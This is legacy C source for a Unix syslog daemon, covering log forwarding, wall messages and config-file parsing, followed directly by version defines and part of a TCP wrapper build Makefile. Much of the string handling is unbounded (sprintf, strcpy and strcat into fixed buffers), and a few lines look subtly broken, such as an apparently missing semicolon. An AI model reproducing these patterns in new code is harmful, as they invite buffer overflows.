	v->iov_base = f->f_lasttime;
	v->iov_len = 15;
	v++;
	v->iov_base = " ";
	v->iov_len = 1;
	v++;
	v->iov_base = f->f_prevhost;
	v->iov_len = strlen(v->iov_base);
	v++;
	v->iov_base = " ";
	v->iov_len = 1;
	v++;
	if (msg) {
		v->iov_base = msg;
		v->iov_len = strlen(msg);
	} else if (f->f_prevcount > 1) {
		(void) sprintf(repbuf, "last message repeated %d times",
		    f->f_prevcount);
		v->iov_base = repbuf;
		v->iov_len = strlen(repbuf);
	} else {
		v->iov_base = f->f_prevline;
		v->iov_len = f->f_prevlen;
	}
	v++;

	dprintf("logging to %s", TypeNames[f->f_type]);

	switch (f->f_type) {
	case F_UNUSED:
		f->f_time = now;
		dprintf("\n");
		break;

	case F_FORW_SUSP:
		fwd_suspend = time((time_t *) 0) - f->f_time;
		if ( fwd_suspend >= INET_SUSPEND_TIME ) {
			dprintf("\nForwarding suspension over, " \
				"retrying FORW ");
			f->f_type = F_FORW;
			goto f_forw;
		}
		else {
			dprintf(" %s\n", f->f_un.f_forw.f_hname);
			dprintf("Forwarding suspension not over, time " \
				"left: %d.\n", INET_SUSPEND_TIME - \
				fwd_suspend);
		}
		break;
		
	/*
	 * The trick is to wait some time, then retry to get the
	 * address. If that fails retry x times and then give up.
	 *
	 * You'll run into this problem mostly if the name server you
	 * need for resolving the address is on the same machine, but
	 * is started after syslogd. 
	 */
	case F_FORW_UNKN:
		dprintf(" %s\n", f->f_un.f_forw.f_hname);
		fwd_suspend = time((time_t *) 0) - f->f_time;
		if ( fwd_suspend >= INET_SUSPEND_TIME ) {
			dprintf("Forwarding suspension to unknown over, retrying\n");
			if ( (hp = gethostbyname(f->f_un.f_forw.f_hname)) == NULL ) {
				dprintf("Failure: %s\n", sys_h_errlist[h_errno]);
				dprintf("Retries: %d\n", f->f_prevcount);
				if ( --f->f_prevcount < 0 ) {
					dprintf("Giving up.\n");
					f->f_type = F_UNUSED;
				}
				else
					dprintf("Left retries: %d\n", f->f_prevcount);
			}
			else {
			        dprintf("%s found, resuming.\n", f->f_un.f_forw.f_hname);
				bcopy(hp->h_addr, (char *) &f->f_un.f_forw.f_addr.sin_addr, hp->h_length);
				f->f_type = F_FORW;
				goto f_forw;
			}
		}
		else
			dprintf("Forwarding suspension not over, time " \
				"left: %d\n", INET_SUSPEND_TIME - fwd_suspend);
		break;

	case F_FORW:
		/* 
		 * Don't send any message to a remote host if it
		 * already comes from one. (we don't care 'bout who
		 * sent the message, we don't send it anyway)  -Joey
		 */
	f_forw:
		dprintf(" %s\n", f->f_un.f_forw.f_hname);
		if ( strcmp(from, LocalHostName) && NoHops )
			dprintf("Not sending message to remote.\n");
		else {
			f->f_time = now;
			(void) sprintf(line, "<%d>%s", f->f_prevpri, \
				(char *) iov[4].iov_base);
			strcat(line, "\n");	/* ASP */
			l = strlen(line);
			if (l > MAXLINE)
				l = MAXLINE;
			if (sendto(finet, line, l, 0, \
				   (struct sockaddr *) &f->f_un.f_forw.f_addr,
				   sizeof(f->f_un.f_forw.f_addr)) != l) {
				int e = errno;
				dprintf("INET sendto error: %d = %s.\n", 
					e, strerror(e));
				f->f_type = F_FORW_SUSP;
				errno = e;
				logerror("sendto");
			}
		}
		break;

	case F_CONSOLE:
		f->f_time = now;
#ifdef UNIXPC
		if (1) {
#else
		if (flags & IGN_CONS) {	
#endif
			dprintf(" (ignored).\n");
			break;
		}
		/* FALLTHROUGH */

	case F_TTY:
	case F_FILE:
		f->f_time = now;
		dprintf(" %s\n", f->f_un.f_fname);
		if (f->f_type != F_FILE) {
			v->iov_base = "\r\n";
			v->iov_len = 2;
		} else {
			v->iov_base = "\n";
			v->iov_len = 1;
		}
	again:
		if (writev(f->f_file, iov, 6) < 0) {
			int e = errno;
			(void) close(f->f_file);
			/*
			 * Check for EBADF on TTY's due to vhangup() XXX
			 */
			if (e == EBADF && f->f_type != F_FILE) {
				f->f_file = open(f->f_un.f_fname, O_WRONLY|O_APPEND|O_NOCTTY);
				if (f->f_file < 0) {
					f->f_type = F_UNUSED;
					logerror(f->f_un.f_fname);
				} else {
					untty();
					goto again;
				}
			} else {
				f->f_type = F_UNUSED;
				errno = e;
				logerror(f->f_un.f_fname);
			}
		} else if (f->f_flags & SYNC_FILE)
			(void) fsync(f->f_file);
		break;

	case F_USERS:
	case F_WALL:
		f->f_time = now;
		dprintf("\n");
		v->iov_base = "\r\n";
		v->iov_len = 2;
		wallmsg(f, iov);
		break;
	} /* switch */
	if (f->f_type != F_FORW_UNKN)
		f->f_prevcount = 0;
	return;		
}

jmp_buf ttybuf;

void endtty()
{
	longjmp(ttybuf, 1);
}

/*
 *  WALLMSG -- Write a message to the world at large
 *
 *	Write the specified message to either the entire
 *	world, or a list of approved users.
 */

void wallmsg(f, iov)
	register struct filed *f;
	struct iovec *iov;
{
	char p[6 + UNAMESZ];
	register int i;
	int ttyf, len;
	FILE *uf;
	static int reenter = 0;
	struct utmp ut;
	char greetings[200];

	if (reenter++)
		return;

	/* open the user login file */
	if ((uf = fopen(UTMP_FILE, "r")) == NULL) {
		logerror(UTMP_FILE);
		reenter = 0;
		return;
	}

	/*
	 * Might as well fork instead of using nonblocking I/O
	 * and doing notty().
	 */
	if (fork() == 0) {
		(void) signal(SIGTERM, SIG_DFL);
		(void) alarm(0);
		(void) signal(SIGALRM, endtty);
#ifndef SYSV
		(void) signal(SIGTTOU, SIG_IGN);
		(void) sigsetmask(0);
#endif
		(void) sprintf(greetings,
		    "\r\n\7Message from syslogd@%s at %.24s ...\r\n",
			(char *) iov[2].iov_base, ctime(&now));
		len = strlen(greetings);

		/* scan the user login file */
		while (fread((char *) &ut, sizeof(ut), 1, uf) == 1) {
			/* is this slot used? */
			if (ut.ut_name[0] == '\0')
				continue;
			if (ut.ut_type == LOGIN_PROCESS)
			        continue;
			if (!(strcmp (ut.ut_name,"LOGIN"))) /* paranoia */
			        continue;

			/* should we send the message to this user? */
			if (f->f_type == F_USERS) {
				for (i = 0; i < MAXUNAMES; i++) {
					if (!f->f_un.f_uname[i][0]) {
						i = MAXUNAMES;
						break;
					}
					if (strncmp(f->f_un.f_uname[i],
					    ut.ut_name, UNAMESZ) == 0)
						break;
				}
				if (i >= MAXUNAMES)
					continue;
			}

			/* compute the device name */
			strcpy(p, _PATH_DEV);
			strncat(p, ut.ut_line, UNAMESZ);

			if (f->f_type == F_WALL) {
				iov[0].iov_base = greetings;
				iov[0].iov_len = len;
				iov[1].iov_len = 0;
			}
			if (setjmp(ttybuf) == 0) {
				(void) alarm(15);
				/* open the terminal */
				ttyf = open(p, O_WRONLY|O_NOCTTY);
				if (ttyf >= 0) {
					struct stat statb;

					if (fstat(ttyf, &statb) == 0 &&
					    (statb.st_mode & S_IWRITE))
						(void) writev(ttyf, iov, 6);
					close(ttyf);
					ttyf = -1;
				}
			}
			(void) alarm(0);
		}
		exit(0);
	}
	/* close the user login file */
	(void) fclose(uf);
	reenter = 0;
}

void reapchild()
{
#if defined(SYSV) && !defined(linux)
	(void) signal(SIGCHLD, reapchild);	/* reset signal handler -ASP */
	wait ((int *)0);
#else
	union wait status;

	while (wait3(&status, WNOHANG, (struct rusage *) NULL) > 0)
		;
#endif
#ifdef linux
	(void) signal(SIGCHLD, reapchild);	/* reset signal handler -ASP */
#endif
}

/*
 * Return a printable representation of a host address.
 */
const char *cvthname(f)
	struct sockaddr_in *f;
{
	struct hostent *hp;
	register char *p;
	int count;

	if (f->sin_family != AF_INET) {
		dprintf("Malformed from address.\n");
		return ("???");
	}
	hp = gethostbyaddr((char *) &f->sin_addr, sizeof(struct in_addr), \
			   f->sin_family);
	if (hp == 0) {
		dprintf("Host name for your address (%s) unknown.\n",
			inet_ntoa(f->sin_addr));
		return (inet_ntoa(f->sin_addr));
	}
	/*
	 * Convert to lower case, just like LocalDomain above
	 */
	for (p = (char *)hp->h_name; *p ; p++)
		if (isupper(*p))
			*p = tolower(*p);

	/*
	 * Notice that the string still contains the fqdn, but your
	 * hostname and domain are separated by a '\0'.
	 */
	if ((p = index(hp->h_name, '.'))) {
		if (strcmp(p + 1, LocalDomain) == 0) {
			*p = '\0';
			return (hp->h_name);
		} else {
			if (StripDomains) {
				count=0;
				while (StripDomains[count]) {
					if (strcmp(p + 1, StripDomains[count]) == 0) {
						*p = '\0';
						return (hp->h_name);
					}
					count++;
				}
			}
			if (LocalHosts) {
				count=0;
				while (LocalHosts[count]) {
					if (!strcmp(hp->h_name, LocalHosts[count])) {
						*p = '\0';
						return (hp->h_name);
					}
					count++;
				}
			}
		}
	}

	return (hp->h_name);
}

void domark()
{
	register struct filed *f;
#ifdef SYSV
	int lognum;
#endif

	now = time(0);
	MarkSeq += TIMERINTVL;
	if (MarkSeq >= MarkInterval) {
		logmsg(LOG_INFO, "-- MARK --", LocalHostName, ADDDATE|MARK);
		MarkSeq = 0;
	}

#ifdef SYSV
	for (lognum = 0; lognum <= nlogs; lognum++) {
		f = &Files[lognum];
#else
	for (f = Files; f; f = f->f_next) {
#endif
		if (f->f_prevcount && now >= REPEATTIME(f)) {
			dprintf("flush %s: repeated %d times, %d sec.\n",
			    TypeNames[f->f_type], f->f_prevcount,
			    repeatinterval[f->f_repeatcount]);
			fprintlog(f, LocalHostName, 0, (char *)NULL);
			BACKOFF(f);
		}
	}
	(void) signal(SIGALRM, domark);
	(void) alarm(TIMERINTVL);
}

void debug_switch()

{
	dprintf("Switching debugging_on to %s\n", (debugging_on == 0) ? "true" : "false");
	debugging_on = (debugging_on == 0) ? 1 : 0;
	signal(SIGUSR1, debug_switch);
}


/*
 * Print syslogd errors some place.
 */
void logerror(type)
	char *type;
{
	char buf[100];

	dprintf("Called loggerr, msg: %s\n", type);

	if (errno == 0)
		(void) sprintf(buf, "syslogd: %s", type);
	else if ((unsigned) errno > sys_nerr)
		(void) sprintf(buf, "syslogd: %s: error %d", type, errno);
	else
		(void) sprintf(buf, "syslogd: %s: %s", type, sys_errlist[errno]);
	errno = 0;
	logmsg(LOG_SYSLOG|LOG_ERR, buf, LocalHostName, ADDDATE);
	return;
}

void die(sig)

	int sig;
	
{
	register struct filed *f;
	char buf[100];
	int lognum;

	for (lognum = 0; lognum <= nlogs; lognum++) {
		f = &Files[lognum];
		/* flush any pending output */
		if (f->f_prevcount)
			fprintlog(f, LocalHostName, 0, (char *)NULL);
	}

	if (sig) {
		dprintf("syslogd: exiting on signal %d\n", sig);
		(void) sprintf(buf, "exiting on signal %d", sig);
		errno = 0;
		logerror(buf);
	}

	/* Close the sockets. */
        close(funix);
	close(inetm);

	/* Clean-up files. */
	(void) unlink(LogName);
	(void) remove_pid(PidFile);
	exit(0);
}

/*
 *  INIT -- Initialize syslogd from configuration table
 */

void init()
{
	register int i, lognum;
	register FILE *cf;
	register struct filed *f, **nextp = (struct filed **) 0;
	register char *p;
	char cline[BUFSIZ];

	dprintf("Called init.\n");

	/*
	 *  Close all open log files.
	 */
	Initialized = 0;
	if ( nlogs > -1 )
	{
		dprintf("Initializing log structures.\n");
		nlogs = -1;
		free((void *) Files);
		Files = (struct filed *) 0;
	}
	
#ifdef SYSV
	for (lognum = 0; lognum <= nlogs; lognum++ ) {
		f = &Files[lognum];
#else
	for (f = Files; f != NULL; f = next) {
#endif
		/* flush any pending output */
		if (f->f_prevcount)
			fprintlog(f, LocalHostName, 0, (char *)NULL);

		switch (f->f_type) {
		  case F_FILE:
		  case F_TTY:
		  case F_CONSOLE:
			(void) close(f->f_file);
			break;
		}
#ifdef SYSV
		f->f_type = F_UNUSED;	/* clear entry - ASP */
	}
#else
		next = f->f_next;
		free((char *) f);
	}
	Files = NULL;
	nextp = &OBFiles;
#endif

	/* open the configuration file */
	if ((cf = fopen(ConfFile, "r")) == NULL) {
		dprintf("cannot open %s.\n", ConfFile);
#ifdef SYSV
		cfline("*.ERR\t" _PATH_CONSOLE, *nextp);
#else
		*nextp = (struct filed *)calloc(1, sizeof(*f));
		cfline("*.ERR\t" _PATH_CONSOLE, *nextp);
		(*nextp)->f_next = (struct filed *)calloc(1, sizeof(*f))	/* ASP */
		cfline("*.PANIC\t*", (*nextp)->f_next);
#endif
		Initialized = 1;
		return;
	}

	/*
	 *  Foreach line in the conf table, open that file.
	 */
#ifdef SYSV
	lognum = 0;
#else
	f = NULL;
#endif
	while (fgets(cline, sizeof(cline), cf) != NULL) {
		/*
		 * check for end-of-section, comments, strip off trailing
		 * spaces and newline character.
		 */
		for (p = cline; isspace(*p); ++p);
		if (*p == '\0' || *p == '#')
			continue;
		for (p = index(cline, '\0'); isspace(*--p););
		*++p = '\0';
#ifndef SYSV
		f = (struct filed *)calloc(1, sizeof(*f));
		*nextp = f;
		nextp = &f->f_next;
#endif
		allocate_log();
		f = &Files[lognum++];
		cfline(cline, f);
	}

	/* close the configuration file */
	(void) fclose(cf);

	Initialized = 1;

	if ( Debug ) {
#ifdef SYSV
		for (lognum = 0; lognum <= nlogs; lognum++) {
			f = &Files[lognum];
			if (f->f_type != F_UNUSED) {
				printf ("%2d: ", lognum);
#else
		for (f = Files; f; f = f->f_next) {
			if (f->f_type != F_UNUSED) {
#endif
				for (i = 0; i <= LOG_NFACILITIES; i++)
					if (f->f_pmask[i] == TABLE_NOPRI)
						printf(" X ");
					else
						printf("%2X ", f->f_pmask[i]);
				printf("%s: ", TypeNames[f->f_type]);
				switch (f->f_type) {
				case F_FILE:
				case F_TTY:
				case F_CONSOLE:
					printf("%s", f->f_un.f_fname);
					break;

				case F_FORW:
				case F_FORW_SUSP:
				case F_FORW_UNKN:
					printf("%s", f->f_un.f_forw.f_hname);
					break;

				case F_USERS:
					for (i = 0; i < MAXUNAMES && *f->f_un.f_uname[i]; i++)
						printf("%s, ", f->f_un.f_uname[i]);
					break;
				}
				printf("\n");
			}
		}
	}

	if ( AcceptRemote )
		logmsg(LOG_SYSLOG|LOG_INFO, "syslogd " VERSION "-" PATCHLEVEL \
		       ": restart (remote reception)." , LocalHostName, \
		       	ADDDATE);
	else
		logmsg(LOG_SYSLOG|LOG_INFO, "syslogd " VERSION "-" PATCHLEVEL \
		       ": restart." , LocalHostName, ADDDATE);
	(void) signal(SIGHUP, sighup_handler);
	dprintf("syslogd: restarted.\n");
}

/*
 * Crack a configuration file line
 */

void cfline(line, f)
	char *line;
	register struct filed *f;
{
	register char *p;
	register char *q;
	register int i, i2;
	char *bp;
	int pri;
	int singlpri = 0;
	int ignorepri = 0;
	int syncfile;
	struct hostent *hp;
	char buf[MAXLINE];

	dprintf("cfline(%s)\n", line);

	errno = 0;	/* keep sys_errlist stuff out of logerror messages */

	/* clear out file entry */
#ifndef SYSV
	bzero((char *) f, sizeof(*f));
#endif
	for (i = 0; i <= LOG_NFACILITIES; i++) {
		f->f_pmask[i] = TABLE_NOPRI;
		f->f_flags = 0;
	}

	/* scan through the list of selectors */
	for (p = line; *p && *p != '\t' && *p != ' ';) {

		/* find the end of this facility name list */
		for (q = p; *q && *q != '\t' && *q++ != '.'; )
			continue;

		/* collect priority name */
		for (bp = buf; *q && !index("\t ,;", *q); )
			*bp++ = *q++;
		*bp = '\0';

		/* skip cruft */
		while (index(",;", *q))
			q++;

		/* decode priority name */
		if ( *buf == '!' ) {
			ignorepri = 1;
			for (bp=buf; *(bp+1); bp++)
				*bp=*(bp+1);
			*bp='\0';
		}
		if ( *buf == '=' )
		{
			singlpri = 1;
			pri = decode(&buf[1], PriNames);
		}
		else {
		        singlpri = 0;
			pri = decode(buf, PriNames);
		}

		if (pri < 0) {
			char xbuf[200];

			(void) sprintf(xbuf, "unknown priority name \"%s\"", buf);
			logerror(xbuf);
			return;
		}

		/* scan facilities */
		while (*p && !index("\t .;", *p)) {
			for (bp = buf; *p && !index("\t ,;.", *p); )
				*bp++ = *p++;
			*bp = '\0';
			if (*buf == '*') {
				for (i = 0; i < LOG_NFACILITIES; i++) {
					if ( pri == INTERNAL_NOPRI ) {
						if ( ignorepri )
							f->f_pmask[i] = TABLE_ALLPRI;
						else
							f->f_pmask[i] = TABLE_NOPRI;
					}
					else if ( singlpri ) {
						if ( ignorepri )
				  			f->f_pmask[i] &= ~(1<<pri);
						else
				  			f->f_pmask[i] |= (1<<pri);
					}
					else
					{
						if ( pri == TABLE_ALLPRI ) {
							if ( ignorepri )
								f->f_pmask[i] = TABLE_NOPRI;
							else
								f->f_pmask[i] = TABLE_ALLPRI;
						}
						else
						{
							if ( ignorepri )
								for (i2= 0; i2 <= pri; ++i2)
									f->f_pmask[i] &= ~(1<<i2);
							else
								for (i2= 0; i2 <= pri; ++i2)
									f->f_pmask[i] |= (1<<i2);
						}
					}
				}
			} else {
				i = decode(buf, FacNames);
				if (i < 0) {
					char xbuf[200];

					(void) sprintf(xbuf, "unknown facility name \"%s\"", buf);
					logerror(xbuf);
					return;
				}

				if ( pri == INTERNAL_NOPRI ) {
					if ( ignorepri )
						f->f_pmask[i >> 3] = TABLE_ALLPRI;
					else
						f->f_pmask[i >> 3] = TABLE_NOPRI;
				} else if ( singlpri ) {
					if ( ignorepri )
						f->f_pmask[i >> 3] &= ~(1<<pri);
					else
						f->f_pmask[i >> 3] |= (1<<pri);
				} else {
					if ( pri == TABLE_ALLPRI ) {
						if ( ignorepri )
							f->f_pmask[i >> 3] = TABLE_NOPRI;
						else
							f->f_pmask[i >> 3] = TABLE_ALLPRI;
					} else {
						if ( ignorepri )
							for (i2= 0; i2 <= pri; ++i2)
								f->f_pmask[i >> 3] &= ~(1<<i2);
						else
							for (i2= 0; i2 <= pri; ++i2)
								f->f_pmask[i >> 3] |= (1<<i2);
					}
				}
			}
			while (*p == ',' || *p == ' ')
				p++;
		}

		p = q;
	}

	/* skip to action part */
	while (*p == '\t' || *p == ' ')
		p++;

	if (*p == '-')
	{
		syncfile = 0;
		p++;
	} else
		syncfile = 1;

	dprintf("leading char in action: %c\n", *p);
	switch (*p)
	{
	case '@':
#ifdef SYSLOG_INET
		if (!InetInuse)
			break;
		(void) strcpy(f->f_un.f_forw.f_hname, ++p);
		dprintf("forwarding host: %s\n", p);	/*ASP*/
		if ( (hp = gethostbyname(p)) == NULL ) {
			f->f_type = F_FORW_UNKN;
			f->f_prevcount = INET_RETRY_MAX;
		} else {
			f->f_type = F_FORW;
		}
		bzero((char *) &f->f_un.f_forw.f_addr,
			 sizeof(f->f_un.f_forw.f_addr));
		f->f_un.f_forw.f_addr.sin_family = AF_INET;
		f->f_un.f_forw.f_addr.sin_port = LogPort;
		if ( f->f_type == F_FORW )
			bcopy(hp->h_addr, (char *) &f->f_un.f_forw.f_addr.sin_addr, hp->h_length);
		/*
		 * Otherwise the host might be unknown due to an
		 * inaccessible nameserver (perhaps on the same
		 * host). We try to get the ip number later, like
		 * FORW_SUSP.
		 */
#endif
		break;

        case '|':
	case '/':
		(void) strcpy(f->f_un.f_fname, p);
		dprintf ("filename: %s\n", p);	/*ASP*/
		if (syncfile)
			f->f_flags |= SYNC_FILE;
		if ( *p == '|' )
			f->f_file = open(++p, O_RDWR);
	        else
			f->f_file = open(p, O_WRONLY|O_APPEND|O_CREAT|O_NOCTTY,
					 0644);
		        
	  	if ( f->f_file < 0 ){
			f->f_file = F_UNUSED;
			dprintf("Error opening log file: %s\n", p);
			logerror(p);
			break;
		}
		if (isatty(f->f_file)) {
			f->f_type = F_TTY;
			untty();
		}
		else
			f->f_type = F_FILE;
		if (strcmp(p, ctty) == 0)
			f->f_type = F_CONSOLE;
		break;

	case '*':
		dprintf ("write-all\n");
		f->f_type = F_WALL;
		break;

	default:
		dprintf ("users: %s\n", p);	/* ASP */
		for (i = 0; i < MAXUNAMES && *p; i++) {
			for (q = p; *q && *q != ','; )
				q++;
			(void) strncpy(f->f_un.f_uname[i], p, UNAMESZ);
			if ((q - p) > UNAMESZ)
				f->f_un.f_uname[i][UNAMESZ] = '\0';
			else
				f->f_un.f_uname[i][q - p] = '\0';
			while (*q == ',' || *q == ' ')
				q++;
			p = q;
		}
		f->f_type = F_USERS;
		break;
	}
	return;
}


/*
 *  Decode a symbolic name to a numeric value
 */

int decode(name, codetab)
	char *name;
	struct code *codetab;
{
	register struct code *c;
	register char *p;
	char buf[40];

	dprintf ("symbolic name: %s", name);
	if (isdigit(*name))
	{
		dprintf ("\n");
		return (atoi(name));
	}
	(void) strcpy(buf, name);
	for (p = buf; *p; p++)
		if (isupper(*p))
			*p = tolower(*p);
	for (c = codetab; c->c_name; c++)
		if (!strcmp(buf, c->c_name))
		{
			dprintf (" ==> %d\n", c->c_val);
			return (c->c_val);
		}
	return (-1);
}

static void dprintf(char *fmt, ...)

{
	va_list ap;

	if ( !(Debug && debugging_on) )
		return;
	
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);

	fflush(stdout);
	return;
}


/*
 * The following function is responsible for allocating/reallocating the
 * array which holds the structures which define the logging outputs.
 */
static void allocate_log()

{
	dprintf("Called allocate_log, nlogs = %d.\n", nlogs);
	
	/*
	 * Decide whether the array needs to be initialized or needs to
	 * grow.
	 */
	if ( nlogs == -1 )
	{
		Files = (struct filed *) malloc(sizeof(struct filed));
		if ( Files == (void *) 0 )
		{
			dprintf("Cannot initialize log structure.");
			logerror("Cannot initialize log structure.");
			return;
		}
	}
	else
	{
		/* Re-allocate the array. */
		Files = (struct filed *) realloc(Files, (nlogs+2) * \
						  sizeof(struct filed));
		if ( Files == (struct filed *) 0 )
		{
			dprintf("Cannot grow log structure.");
			logerror("Cannot grow log structure.");
			return;
		}
	}
	
	/*
	 * Initialize the array element, bump the number of elements in the
	 * the array and return.
	 */
	++nlogs;
	memset(&Files[nlogs], '\0', sizeof(struct filed));
	return;
}


/*
 * The following function is resposible for handling a SIGHUP signal.  Since
 * we are now doing mallocs/free as part of init we had better not being
 * doing this during a signal handler.  Instead this function simply sets
 * a flag variable which will tell the main loop to go through a restart.
 */
void sighup_handler()

{
	restart = 1;
	signal(SIGHUP, sighup_handler);
	return;
}
#define VERSION "1.3"
#define PATCHLEVEL "0"
# @(#) Makefile 1.21 96/03/25 19:22:24

#######################################################
# Choice between easy and advanced installation recipe.
# 
# Advanced installation: vendor-provided daemons are left alone, and the
# inetd configuration file is edited. In this case, the REAL_DAEMON_DIR
# macro should reflect the actual directory with (most of) your
# vendor-provided network daemons.  These names can be found in the
# inetd.conf file. Usually, the telnet, ftp and finger daemons all live
# in the same directory.
# 
# Uncomment the appropriate line if you are going to edit inetd.conf.
#
# Ultrix 4.x SunOS 4.x ConvexOS 10.x Dynix/ptx
#REAL_DAEMON_DIR=/usr/etc
#
# SysV.4 Solaris 2.x OSF AIX
REAL_DAEMON_DIR=/usr/sbin
#
# BSD 4.4
#REAL_DAEMON_DIR=/usr/libexec
#
# HP-UX SCO Unicos
#REAL_DAEMON_DIR=/etc

# Easy installation: vendor-provided network daemons are moved to "some
# other" directory, and the tcpd wrapper fills in the "holes". For this
# mode of operation, the REAL_DAEMON_DIR macro should be set to the "some
# other" directory.  The "..." is here for historical reasons only; you
# should probably use some other name. 
# 
# Uncomment the appropriate line if you are going to move your daemons.
#
# Ultrix 4.x SunOS 4.x ConvexOS 10.x Dynix/ptx
#REAL_DAEMON_DIR=/usr/etc/...
#
# SysV.4 Solaris 2.x OSF AIX
#REAL_DAEMON_DIR=/usr/sbin/...
#
# BSD 4.4
#REAL_DAEMON_DIR=/usr/libexec/...
#
# HP-UX SCO Unicos
#REAL_DAEMON_DIR=/etc/...

# End of mandatory section
##########################

##########################################
# Ready-to-use system-dependent templates.
#
# Ready-to-use templates are available for many systems (see the "echo"
# commands at the start of this Makefile).  The templates take care of
# all system dependencies: after editing the REAL_DAEMON_DIR definition
# above, do a "make sunos4" (or whatever system type is appropriate).
#
# If your system is not listed (or something that comes close enough), you
# have to edit the system dependencies section below and do a "make other".  
#
# Send templates for other UNIX versions to wietse@wzv.win.tue.nl.

# This is good for many BSD+SYSV hybrids with NIS (formerly YP).
generic aix osf alpha dynix:
	@make REAL_DAEMON_DIR=$(REAL_DAEMON_DIR) STYLE=$(STYLE) \
	LIBS= RANLIB=ranlib ARFLAGS=rv AUX_OBJ=setenv.o \
	NETGROUP=-DNETGROUP TLI= all

# Generic with resolver library.
generic-resolver:
	@make REAL_DAEMON_DIR=$(REAL_DAEMON_DIR) STYLE=$(STYLE) \
	LIBS=-lresolv RANLIB=ranlib ARFLAGS=rv AUX_OBJ=setenv.o \
	NETGROUP=-DNETGROUP TLI= all

# Free bsd and linux by default have no NIS.
386bsd netbsd:
	@make REAL_DAEMON_DIR=$(REAL_DAEMON_DIR) STYLE=$(STYLE) \
	LIBS= RANLIB=ranlib ARFLAGS=rv AUX_OBJ= NETGROUP= TLI= \
	EXTRA_CFLAGS=-DSYS_ERRLIST_DEFINED VSYSLOG= all

freebsd:
	@make REAL_DAEMON_DIR=$(REAL_DAEMON_DIR) STYLE=$(STYLE) \
	LIBS= RANLIB=ranlib ARFLAGS=rv AUX_OBJ= NETGROUP= TLI= \
	EXTRA_CFLAGS=-DSYS_ERRLIST_DEFINED VSYSLOG= all

linux:
	@make REAL_DAEMON_DIR=$(REAL_DAEMON_DIR) STYLE=$(STYLE) \
	LIBS= RANLIB=ranlib ARFLAGS=rv AUX_OBJ=setenv.o \
	NETGROUP= TLI= EXTRA_CFLAGS="-DBROKEN_SO_LINGER" all


###############################################################
# System dependencies: TLI (transport-level interface) support.
# 
# Uncomment the following macro if your system has System V.4-style TLI
# support (/usr/include/sys/timod.h, /etc/netconfig, and the netdir(3)
# routines).
#
#TLI	= -DTLI

###############################################################################
# System dependencies: differences between ranlib(1) and ar(1) implementations.
#
# Some C compilers (Ultrix 4.x) insist that ranlib(1) be run on an object
# library; some don't care as long as the modules are in the right order;
# some systems don't even have a ranlib(1) command. Make your choice.

RANLIB	= ranlib	# have ranlib (BSD-ish UNIX)
#RANLIB	= echo		# no ranlib (SYSV-ish UNIX)

ARFLAGS	= rv		# most systems
#ARFLAGS= rvs		# IRIX 4.0.x

AR	= ar
#AR	= bld		# Unicos 8.x

#############################################################################
# System dependencies: routines that are not present in the system libraries.
# 
# If your system library does not have set/putenv() or strcasecmp(), use
# the ones provided with this source distribution. The environ.c module
# implements setenv(), getenv(), and putenv().

AUX_OBJ= setenv.o
#AUX_OBJ= environ.o
#AUX_OBJ= environ.o strcasecmp.o

# Uncomment the following if your C library does not provide the
# strchr/strrchr/memcmp routines, but comes with index/rindex/bcmp.
#
#STRINGS= -Dstrchr=index -Dstrrchr=rindex -Dmemcmp=bcmp -Dno_memcpy

#################################################################
# System dependencies: selection of non-default object libraries.
#
# Most System V implementations require that you explicitly specify the
# networking libraries. There is no general consensus, though.
#
#LIBS	= -lsocket -lnsl		# SysV.4 Solaris 2.x
#LIBS	= -lsun				# IRIX
#LIBS	= -lsocket -linet -lnsl -lnfs	# PTX
#LIBS	= -linet -lnsl_s -ldbm		# ISC
#LIBS	= -lnet				# Unicos 7
#LIBS	= -linet -lsyslog -ldbm
#LIBS	= -lsyslog -lsocket -lnsl

######################################################
# System dependencies: system-specific compiler flags.
#
# Apollo Domain/OS offers both bsd and sys5 environments, sometimes
# on the same machine.  If your Apollo is primarily sys5.3 and also
# has bsd4.3, uncomment the following to build under bsd and run under
# either environment.
#
#SYSTYPE= -A run,any -A sys,any

# For MIPS RISC/os 4_52.p3, uncomment the following definition.
#
#SYSTYPE= -sysname bsd43

##################################################
# System dependencies: working around system bugs.
#
# -DGETPEERNAME_BUG works around a getpeername(2) bug in some versions of
# Apollo or SYSV.4 UNIX:  the wrapper would report that all UDP requests
# come from address 0.0.0.0. The workaround does no harm on other systems.
#
# -DBROKEN_FGETS works around an fgets(3) bug in some System V versions
# (IRIX):  fgets() gives up too fast when reading from a network socket.
# The workaround does no harm on other systems.
#
# Some UNIX systems (IRIX) make the error of calling the strtok() library
# routine from other library routines such as, e.g., gethostbyname/addr().
# The result is that hosts can slip through the wrapper allow/deny filters.
# Compile with -DLIBC_CALLS_STRTOK to avoid the vendor's strtok() routine.
# The workaround does no harm on other systems.
#
# DG/UX 5.4.1 comes with an inet_ntoa() function that returns a structure
# instead of a long integer. Compile with -DINET_ADDR_BUG to work around
# this mutant behavour. Fixed in 5.4R3.
#
# Solaris 2.4 gethostbyname(), in DNS through NIS mode, puts only one
# address in the host address list; all other addresses are treated as
# host name aliases. Compile with -DSOLARIS_24_GETHOSTBYNAME_BUG to work
# around this. The workaround does no harm on other Solaris versions.

BUGS = -DGETPEERNAME_BUG -DBROKEN_FGETS -DLIBC_CALLS_STRTOK
#BUGS = -DGETPEERNAME_BUG -DBROKEN_FGETS -DINET_ADDR_BUG
#BUGS = -DGETPEERNAME_BUG -DBROKEN_FGETS -DSOLARIS_24_GETHOSTBYNAME_BUG

##########################################################################
# System dependencies: whether or not your system has NIS (or YP) support.
#
# If your system supports NIS or YP-style netgroups, enable the following
# macro definition. Netgroups are used only for host access control.
#
#NETGROUP= -DNETGROUP

###############################################################
# System dependencies: whether or not your system has vsyslog()
#
# If your system supports vsyslog(), comment out the following definition.
# If in doubt leave it in, it won't harm.

VSYSLOG	= -Dvsyslog=myvsyslog

# End of the system dependencies.
#################################

##############################
# Start of the optional stuff.

###########################################
# Optional: Turning on language extensions
#
# Instead of the default access control language that is documented in
# the hosts_access.5 document, the wrappers can be configured to
# implement an extensible language documented in the hosts_options.5
# document.  This language is implemented by the "options.c" source
# module, which also gives hints on how to add your own extensions.
# Uncomment the next definition to turn on the language extensions
# (examples: allow, deny, banners, twist and spawn).
# 
#STYLE	= -DPROCESS_OPTIONS	# Enable language extensions.

################################################################
# Optional: Changing the default disposition of logfile records
#
# By default, logfile entries are written to the same file as used for
# sendmail transaction logs. See your /etc/syslog.conf file for actual
# path names of logfiles. The tutorial section in the README file
# gives a brief introduction to the syslog daemon.
# 
